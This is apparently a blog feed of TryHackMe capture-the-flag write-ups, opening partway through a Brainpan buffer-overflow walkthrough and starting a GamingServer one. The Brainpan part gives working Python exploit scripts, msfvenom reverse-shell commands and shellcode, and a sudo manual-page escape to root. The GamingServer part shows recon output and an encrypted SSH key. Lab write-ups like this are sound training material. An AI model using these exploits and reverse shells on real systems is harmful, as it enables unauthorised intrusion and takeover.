&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40
\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ive updated the script with the bad character list.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

badchars = (&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;
&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;
&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;
&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;
&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;
&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;
&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)

filler = &quot;A&quot; * 524
EIP = &quot;B&quot; * 4
offset = &quot;C&quot; * 4
junk = &quot;D&quot; * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the script again and checked Immunity Debugger.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/dump.png&quot; alt=&quot;dump&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To check for any issues I right clicked on ESP and selected ‘Follow in Dump’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/badchar.png&quot; alt=&quot;badchar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the output I can see my offset of C’s which is 43 43 43 43 then the null byte 00 but instead of 01 I see FB, thats not what I expected which highlights that \x00 is a bad character. I update my script removing /x00 from the bad chars list and run it again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/goodchar.png&quot; alt=&quot;goodchar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks like what I was expecting, I can see my offset and then each of the characters in the bad char list. Scanning through I don’t see any more bad characters. I.e no other characters have malformed the output.&lt;/p&gt;

&lt;h4 id=&quot;find-a-return-address&quot;&gt;Find a Return Address&lt;/h4&gt;

&lt;p&gt;Our next step is to find a return address for our exploit. To do this I use the Immunity Debugger plugin mona.py plugin. Running ‘!mona modules’ in the bottom bar of Immunity Debugger I can see all the modules used. I am looking for any module which has False displayed across columns as this means I don’t need to worry about protection mechanisms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/monamodules.png&quot; alt=&quot;monamodules&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Only one is available and its the brainpan.exe itself, now to check for JMP ESP pointers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/monafind.png&quot; alt=&quot;monafind&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Again only one with the value 311712f3. x86 architectures stores values in memory using little endian which means we need to reverse the byte order when adding to our script.&lt;/p&gt;

&lt;p&gt;Now I have a JMP ESP value I update the script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

filler = &quot;A&quot; * 524
EIP = &quot;\xf3\x12\x17\x31&quot; #JMP ESP - 311712f3
offset = &quot;C&quot; * 4
junk = &quot;D&quot; * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;create-shell-code&quot;&gt;Create shell code&lt;/h4&gt;

&lt;p&gt;Nearly finished, the last step is to add our payload that will create a reverse shell to our machine. To do this I used msfvenom.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b &quot;\x00&quot;
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
&quot;\xba\xc3\x19\x14\x09\xdb\xc6\xd9\x74\x24\xf4\x58\x2b\xc9\xb1&quot;
&quot;\x52\x83\xe8\xfc\x31\x50\x0e\x03\x93\x17\xf6\xfc\xef\xc0\x74&quot;
&quot;\xfe\x0f\x11\x19\x76\xea\x20\x19\xec\x7f\x12\xa9\x66\x2d\x9f&quot;
&quot;\x42\x2a\xc5\x14\x26\xe3\xea\x9d\x8d\xd5\xc5\x1e\xbd\x26\x44&quot;
&quot;\x9d\xbc\x7a\xa6\x9c\x0e\x8f\xa7\xd9\x73\x62\xf5\xb2\xf8\xd1&quot;
&quot;\xe9\xb7\xb5\xe9\x82\x84\x58\x6a\x77\x5c\x5a\x5b\x26\xd6\x05&quot;
&quot;\x7b\xc9\x3b\x3e\x32\xd1\x58\x7b\x8c\x6a\xaa\xf7\x0f\xba\xe2&quot;
&quot;\xf8\xbc\x83\xca\x0a\xbc\xc4\xed\xf4\xcb\x3c\x0e\x88\xcb\xfb&quot;
&quot;\x6c\x56\x59\x1f\xd6\x1d\xf9\xfb\xe6\xf2\x9c\x88\xe5\xbf\xeb&quot;
&quot;\xd6\xe9\x3e\x3f\x6d\x15\xca\xbe\xa1\x9f\x88\xe4\x65\xfb\x4b&quot;
&quot;\x84\x3c\xa1\x3a\xb9\x5e\x0a\xe2\x1f\x15\xa7\xf7\x2d\x74\xa0&quot;
&quot;\x34\x1c\x86\x30\x53\x17\xf5\x02\xfc\x83\x91\x2e\x75\x0a\x66&quot;
&quot;\x50\xac\xea\xf8\xaf\x4f\x0b\xd1\x6b\x1b\x5b\x49\x5d\x24\x30&quot;
&quot;\x89\x62\xf1\x97\xd9\xcc\xaa\x57\x89\xac\x1a\x30\xc3\x22\x44&quot;
&quot;\x20\xec\xe8\xed\xcb\x17\x7b\xd2\xa4\x16\x3d\xba\xb6\x18\xd0&quot;
&quot;\x66\x3e\xfe\xb8\x86\x16\xa9\x54\x3e\x33\x21\xc4\xbf\xe9\x4c&quot;
&quot;\xc6\x34\x1e\xb1\x89\xbc\x6b\xa1\x7e\x4d\x26\x9b\x29\x52\x9c&quot;
&quot;\xb3\xb6\xc1\x7b\x43\xb0\xf9\xd3\x14\x95\xcc\x2d\xf0\x0b\x76&quot;
&quot;\x84\xe6\xd1\xee\xef\xa2\x0d\xd3\xee\x2b\xc3\x6f\xd5\x3b\x1d&quot;
&quot;\x6f\x51\x6f\xf1\x26\x0f\xd9\xb7\x90\xe1\xb3\x61\x4e\xa8\x53&quot;
&quot;\xf7\xbc\x6b\x25\xf8\xe8\x1d\xc9\x49\x45\x58\xf6\x66\x01\x6c&quot;
&quot;\x8f\x9a\xb1\x93\x5a\x1f\xd1\x71\x4e\x6a\x7a\x2c\x1b\xd7\xe7&quot;
&quot;\xcf\xf6\x14\x1e\x4c\xf2\xe4\xe5\x4c\x77\xe0\xa2\xca\x64\x98&quot;
&quot;\xbb\xbe\x8a\x0f\xbb\xea&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom allows for the reverse shell payload to be created which I can add to the script.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-p - Set the payload in this case I wanted a windows reverse shell&lt;/li&gt;
  &lt;li&gt;LHOST - Set to the TryHackMe VPN IP&lt;/li&gt;
  &lt;li&gt;LPORT - A port on my machine&lt;/li&gt;
  &lt;li&gt;EXITFUNC - If applicable it ensures an applications remains stable when the shell is closed&lt;/li&gt;
  &lt;li&gt;-f - Set the format of the output to c&lt;/li&gt;
  &lt;li&gt;-e - Encoding type to shikata_ga_nai&lt;/li&gt;
  &lt;li&gt;-a - Set architecture&lt;/li&gt;
  &lt;li&gt;-b - provide a list of the bad characters I found earlier&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The final exploit script is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3                                                                                                        
                                                                                                                          
import sys, socket                                                                                                        
from time import sleep                                                                                                    
                                                                                                                          
#badchars = /x00                                                                                                          
                                                                                                                          
#msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b &quot;\x00&quot;
                                                                                                                          
payload = (&quot;\xb8\x6b\x6e\x2b\xda\xda\xc8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;                                                
&quot;\x52\x31\x42\x12\x03\x42\x12\x83\x81\x92\xc9\x2f\xa9\x83\x8c&quot;                                                            
&quot;\xd0\x51\x54\xf1\x59\xb4\x65\x31\x3d\xbd\xd6\x81\x35\x93\xda&quot;                                                            
&quot;\x6a\x1b\x07\x68\x1e\xb4\x28\xd9\x95\xe2\x07\xda\x86\xd7\x06&quot;
&quot;\x58\xd5\x0b\xe8\x61\x16\x5e\xe9\xa6\x4b\x93\xbb\x7f\x07\x06&quot;
&quot;\x2b\x0b\x5d\x9b\xc0\x47\x73\x9b\x35\x1f\x72\x8a\xe8\x2b\x2d&quot;
&quot;\x0c\x0b\xff\x45\x05\x13\x1c\x63\xdf\xa8\xd6\x1f\xde\x78\x27&quot;
&quot;\xdf\x4d\x45\x87\x12\x8f\x82\x20\xcd\xfa\xfa\x52\x70\xfd\x39&quot;
&quot;\x28\xae\x88\xd9\x8a\x25\x2a\x05\x2a\xe9\xad\xce\x20\x46\xb9&quot;
&quot;\x88\x24\x59\x6e\xa3\x51\xd2\x91\x63\xd0\xa0\xb5\xa7\xb8\x73&quot;
&quot;\xd7\xfe\x64\xd5\xe8\xe0\xc6\x8a\x4c\x6b\xea\xdf\xfc\x36\x63&quot;
&quot;\x13\xcd\xc8\x73\x3b\x46\xbb\x41\xe4\xfc\x53\xea\x6d\xdb\xa4&quot;
&quot;\x0d\x44\x9b\x3a\xf0\x67\xdc\x13\x37\x33\x8c\x0b\x9e\x3c\x47&quot;
&quot;\xcb\x1f\xe9\xc8\x9b\x8f\x42\xa9\x4b\x70\x33\x41\x81\x7f\x6c&quot;
&quot;\x71\xaa\x55\x05\x18\x51\x3e\x20\xd5\x4c\x67\x5c\xe7\x6e\x86&quot;
&quot;\xc1\x6e\x88\xc2\xe9\x26\x03\x7b\x93\x62\xdf\x1a\x5c\xb9\x9a&quot;
&quot;\x1d\xd6\x4e\x5b\xd3\x1f\x3a\x4f\x84\xef\x71\x2d\x03\xef\xaf&quot;
&quot;\x59\xcf\x62\x34\x99\x86\x9e\xe3\xce\xcf\x51\xfa\x9a\xfd\xc8&quot;
&quot;\x54\xb8\xff\x8d\x9f\x78\x24\x6e\x21\x81\xa9\xca\x05\x91\x77&quot;
&quot;\xd2\x01\xc5\x27\x85\xdf\xb3\x81\x7f\xae\x6d\x58\xd3\x78\xf9&quot;
&quot;\x1d\x1f\xbb\x7f\x22\x4a\x4d\x9f\x93\x23\x08\xa0\x1c\xa4\x9c&quot;
&quot;\xd9\x40\x54\x62\x30\xc1\x74\x81\x90\x3c\x1d\x1c\x71\xfd\x40&quot;
&quot;\x9f\xac\xc2\x7c\x1c\x44\xbb\x7a\x3c\x2d\xbe\xc7\xfa\xde\xb2&quot;
&quot;\x58\x6f\xe0\x61\x58\xba&quot;)

filler = &quot;A&quot; * 524
EIP = &quot;\xf3\x12\x17\x31&quot; #JMP ESP - 311712f3
offset = &quot;C&quot; * 4
nops = &quot;\x90&quot; * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Before I run the script I change the hosts file to point to the machine IP provided by TryHackMe and start a netcat listener.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.220.224] 35409
CMD Version 1.4.1

Z:\home\puck&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have a shell, the script worked!&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Although the main purpose of the machine is to help with buffer overflow we still need to get administrator on the box. Doing some basic enumeration of the box highlights its actually a linux machine and using wine to run the brainpan.exe application. So I update my exploit script with a linux msfvenom payload and get a new shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msfvenom -p linux/x86/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b &quot;\x00&quot;
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
&quot;\xda\xd2\xd9\x74\x24\xf4\xbe\x14\x22\x5b\xcc\x5f\x29\xc9\xb1&quot;
&quot;\x12\x83\xef\xfc\x31\x77\x13\x03\x63\x31\xb9\x39\xba\xee\xca&quot;
&quot;\x21\xef\x53\x66\xcc\x0d\xdd\x69\xa0\x77\x10\xe9\x52\x2e\x1a&quot;
&quot;\xd5\x99\x50\x13\x53\xdb\x38\xae\xab\x0e\x61\xc6\xa9\x30\x80&quot;
&quot;\x4b\x27\xd1\x12\x15\x67\x43\x01\x69\x84\xea\x44\x40\x0b\xbe&quot;
&quot;\xee\x35\x23\x4c\x86\xa1\x14\x9d\x34\x5b\xe2\x02\xea\xc8\x7d&quot;
&quot;\x25\xba\xe4\xb0\x26&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now with a new linux shell I enumerate the machine again.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running sudo -l shows our user ‘puck’ can run /home/anansi/bin/anansi_util as root with out a password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the utility I get 3 options, manual looks interesting as I can choose a command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I am presented with the man page for bash so I can try to break out of the manual by typing: !/bin/bash&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@brainpan:/usr/share/man# id
uid=0(root) gid=0(root) groups=0(root)
root@brainpan:/usr/share/man# cd /root
root@brainpan:~# ls
b.txt
root@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I exit the manual as root!&lt;/p&gt;

&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="easy" />
      
        <category term="bufferoverflow" />
      
        <category term="oscp" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">GamingServer Write Up</title>
      <link href="https://darrynbrownfield.co.uk/gamingserver" rel="alternate" type="text/html" title="GamingServer Write Up" />
      <published>2020-09-06T00:00:00+00:00</published>
      <updated>2020-09-06T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/gamingserver</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/gamingserver">&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/gamingserver.png&quot; alt=&quot;GamingServer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;GamingServer is an easy Boot2Root machine from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with 2 flags available ‘user.txt’ and ‘root.txt’.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.100.235’. I start by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #nmap -sC -sV -oA nmap/initial 10.10.100.235
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 14:40 BST
Nmap scan report for 10.10.100.235
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two ports, 22 and 80. I will look at port 80 first.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Port 80 brings us to a simple web page, while I look around the website I started a Gobuster in the background.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #gobuster dir -u http://10.10.100.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.100.235
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/06 14:45:50 Starting gobuster
===============================================================
/uploads (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/06 14:48:03 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the source I do see a comment aimed at someone called ‘john’, could be a possible username.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;john, please add some actual content to the site! lorem ipsum is horrible to look at.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the DRAAGAN LORE page is a link to ‘uploads’ which redirects to a directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/draaganlore.png&quot; alt=&quot;draaganlore&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The directory contains 3 files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/uploads.png&quot; alt=&quot;uploads&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using wget I downloaded each one.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/dict.lst
--2020-09-06 14:50:33--  http://10.10.100.235/uploads/dict.lst
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2006 (2.0K)
Saving to: ‘dict.lst’

dict.lst                              100%[========================================================================&amp;gt;]   1.96K  --.-KB/s    in 0s   

2020-09-06 14:50:33 (229 MB/s) - ‘dict.lst’ saved [2006/2006]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/manifesto.txt
--2020-09-06 14:50:52--  http://10.10.100.235/uploads/manifesto.txt
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3070 (3.0K) [text/plain]
Saving to: ‘manifesto.txt’

manifesto.txt                         100%[========================================================================&amp;gt;]   3.00K  --.-KB/s    in 0s   

2020-09-06 14:50:52 (530 MB/s) - ‘manifesto.txt’ saved [3070/3070]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/meme.jpg
--2020-09-06 14:51:09--  http://10.10.100.235/uploads/meme.jpg
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15457 (15K) [image/jpeg]
Saving to: ‘meme.jpg’

meme.jpg                              100%[========================================================================&amp;gt;]  15.09K  --.-KB/s    in 0.02s

2020-09-06 14:51:09 (679 KB/s) - ‘meme.jpg’ saved [15457/15457]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at each file:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dict.lst - Appears to be a list of passwords&lt;/li&gt;
  &lt;li&gt;manifesto.txt - Is a copy of ‘The Hacker Manifesto’ by The Mentor from January 8 1986&lt;/li&gt;
  &lt;li&gt;meme.jpg - Is an image of a muppet&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The dict.lst could be useful, looking back at the Gobuster output is a /secret directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/secret.png&quot; alt=&quot;secret&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside is a SecretKey. Again I will download with wget.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]                                                                                     
└──╼ #wget http://10.10.100.235/secret/secretKey                                                                                                 
--2020-09-06 14:50:07--  http://10.10.100.235/secret/secretKey                                                                                   
Connecting to 10.10.100.235:80... connected.                                                                                                     
HTTP request sent, awaiting response... 200 OK                                                                                                   
Length: 1766 (1.7K)                                                                                                                              
Saving to: ‘secretKey’                                                                                                                           
                                                                                                                                                 
secretKey                             100%[========================================================================&amp;gt;]   1.72K  --.-KB/s    in 0s 
                                                                                                                                                 
2020-09-06 14:52:07 (223 MB/s) - ‘secretKey’ saved [1766/1766]   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great it looks like a encrypted SSH id_rsa key, lets use the password list from the upload folder to crack.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cat secretKey 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
